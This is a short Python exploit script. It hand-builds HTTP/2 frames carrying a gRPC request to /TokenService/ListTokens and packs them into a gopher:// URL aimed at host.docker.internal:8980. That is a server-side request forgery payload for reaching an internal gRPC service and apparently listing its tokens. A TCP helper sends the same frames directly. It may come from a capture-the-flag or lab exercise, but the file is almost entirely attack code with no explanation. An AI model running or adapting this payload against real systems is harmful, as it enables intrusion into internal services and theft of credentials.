import socket

import urllib.parse

packet_1 = bytearray([0x50, 0x52, 0x49, 0x20, 0x2a, 0x20, 0x48, 0x54, 
0x54, 0x50, 0x2f, 0x32, 0x2e, 0x30, 0x0d, 0x0a, 
0x0d, 0x0a, 0x53, 0x4d, 0x0d, 0x0a, 0x0d, 0x0a, 
0x00, 0x00, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 
0x40, 0x00, 0x00, 0x00, 0x05, 0x00, 0x40, 0x00, 
0x00, 0x00, 0x06, 0x00, 0x00, 0x40, 0x00, 0xfe, 
0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x04, 
0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3f, 
0x00, 0x01])
packet_2 = bytearray([0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0xd2, 0x01, 0x04, 0x00, 0x00, 
0x00, 0x01, 0x40, 0x05, 0x3a, 0x70, 0x61, 0x74, 
0x68, 0x18, 0x2f, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 
0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x2f, 
0x4c, 0x69, 0x73, 0x74, 0x54, 0x6f, 0x6b, 0x65, 
0x6e, 0x73, 0x40, 0x0a, 0x3a, 0x61, 0x75, 0x74, 
0x68, 0x6f, 0x72, 0x69, 0x74, 0x79, 0x0e, 0x6c, 
0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 
0x3a, 0x38, 0x39, 0x38, 0x30, 0x83, 0x86, 0x40, 
0x0c, 0x63, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 
0x2d, 0x74, 0x79, 0x70, 0x65, 0x10, 0x61, 0x70, 
0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 
0x6e, 0x2f, 0x67, 0x72, 0x70, 0x63, 0x40, 0x02, 
0x74, 0x65, 0x08, 0x74, 0x72, 0x61, 0x69, 0x6c, 
0x65, 0x72, 0x73, 0x40, 0x14, 0x67, 0x72, 0x70, 
0x63, 0x2d, 0x61, 0x63, 0x63, 0x65, 0x70, 0x74, 
0x2d, 0x65, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 
0x67, 0x17, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x69, 
0x74, 0x79, 0x2c, 0x20, 0x64, 0x65, 0x66, 0x6c, 
0x61, 0x74, 0x65, 0x2c, 0x20, 0x67, 0x7a, 0x69, 
0x70, 0x40, 0x0a, 0x75, 0x73, 0x65, 0x72, 0x2d, 
0x61, 0x67, 0x65, 0x6e, 0x74, 0x2e, 0x67, 0x72, 
0x70, 0x63, 0x2d, 0x70, 0x79, 0x74, 0x68, 0x6f, 
0x6e, 0x2f, 0x31, 0x2e, 0x36, 0x37, 0x2e, 0x31, 
0x20, 0x67, 0x72, 0x70, 0x63, 0x2d, 0x63, 0x2f, 
0x34, 0x34, 0x2e, 0x30, 0x2e, 0x30, 0x20, 0x28, 
0x6f, 0x73, 0x78, 0x3b, 0x20, 0x63, 0x68, 0x74, 
0x74, 0x70, 0x32, 0x29, 0x00, 0x00, 0x04, 0x08, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
0x05, 0x00, 0x00, 0x08, 0x00, 0x01, 0x00, 0x00, 
0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x03, 0x0a, 
0x01, 0x31, 0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05])
packet_3 = bytearray([0x00, 0x00, 0x08, 0x06, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 
0xd2 ])
packet_4 = bytearray([0x00, 0x00, 0x08, 0x06, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x40, 0xd4, 0x59, 0xf4, 0x06, 0x44, 0xda, 
0xa1 ])

def gen_gopher_link(host, port):
    pld = packet_1 + packet_2 + packet_3 # + packet_4
    # pld_exp = packet_1 + packet_2 + packet_3 + packet_4 + packet_1

    # pld = pld_exp
    # pld = packet_1
    # a = []
    # for b in pld:
    #     a.append(hex(b)[2:].zfill(2))
    finalpayload = urllib.parse.quote_from_bytes(pld).replace("+","%20").replace("%2F","/")
    return f"gopher://{host}:{port}/_" + finalpayload


def create_tcp_connection():
    host = 'localhost'
    port = 8980

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        print(f"Connected to {host} on port {port}")
        s.send(packet_1)
        # s.send(packet_2)
        # s.send(packet_3)
        # s.send(packet_4)

        data = s.recv(4096)
        print(data)
        data = s.recv(4096)
        print(data)
        data = s.recv(4096)
        print(data)


# create_tcp_connection()
print(gen_gopher_link("host.docker.internal", 8980))